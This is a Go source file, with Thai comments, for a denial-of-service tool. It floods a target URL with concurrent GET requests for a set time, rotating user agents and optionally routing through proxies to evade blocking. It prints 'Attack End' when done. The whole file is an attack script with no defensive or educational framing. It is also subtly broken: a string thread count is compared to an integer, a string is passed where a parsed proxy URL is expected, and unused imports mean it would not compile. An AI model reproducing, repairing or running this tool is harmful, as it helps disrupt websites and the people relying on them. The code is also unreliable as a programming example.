package main

import (
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
	// เพิ่ม User-Agent เพิ่มเติมตามที่ต้องการ
}

func getRandomUserAgent() string {
	rand.Seed(time.Now().UnixNano())
	return userAgents[rand.Intn(len(userAgents))]
}

func sendRequest(target string, proxy string, wg *sync.WaitGroup) {
	defer wg.Done()
	
	client := &http.Client{}
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		fmt.Println("Request Error:", err)
		return
	}
	req.Header.Set("User-Agent", getRandomUserAgent())

	if proxy != "" {
		proxyURL := "http://" + proxy
		client.Transport = &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
		}
	}

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Request Error:", err)
		return
	}
	defer resp.Body.Close()
	
	fmt.Println("Response Status:", resp.StatusCode)
}

func main() {
	if len(os.Args) != 5 {
		fmt.Println("Usage: go run main.go <URL> <TIME> <THREADS> <bypass/proxy>")
		os.Exit(0)
	}

	target := os.Args[1]
	timeDuration := os.Args[2]
	threads := os.Args[3]
	mode := os.Args[4]

	var proxies []string

	if mode == "proxy" {
		// ดึงพร็อกซีลิสต์
		proxies = []string{
			"proxy1.com:8080",
			"proxy2.com:8080",
			// เพิ่มพร็อกซีเพิ่มเติม
		}
	}

	// ระยะเวลาโจมตี
	duration, _ := time.ParseDuration(timeDuration + "s")
	timeout := time.After(duration)

	var wg sync.WaitGroup

	for {
		select {
		case <-timeout:
			fmt.Println("Attack End")
			os.Exit(0)
		default:
			for i := 0; i < threads; i++ {
				wg.Add(1)
				if mode == "proxy" && len(proxies) > 0 {
					// ใช้พร็อกซีในการส่งคำขอ
					proxy := proxies[rand.Intn(len(proxies))]
					go sendRequest(target, proxy, &wg)
				} else {
					// โหมด bypass ไม่ใช้พร็อกซี
					go sendRequest(target, "", &wg)
				}
			}
			wg.Wait()
		}
	}
}
